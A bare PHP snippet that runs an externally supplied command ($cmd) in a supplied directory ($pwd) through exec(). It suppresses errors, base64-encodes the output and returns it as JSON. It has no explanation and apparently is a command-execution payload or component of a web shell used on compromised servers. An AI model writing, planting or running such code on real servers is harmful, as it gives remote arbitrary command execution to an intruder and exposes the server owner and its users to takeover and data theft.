<?php
set_time_limit(0);
$re = array('code'=>1, 'result'=>array());
chdir($pwd);
if(function_exists('exec')){
    @exec($cmd, $re['result']);
    $re['result'] = join("\n", $re['result']);
    $re['result'] = base64_encode($re['result']);
}else{
    $re['code'] = 0;
}
echo json_encode($re);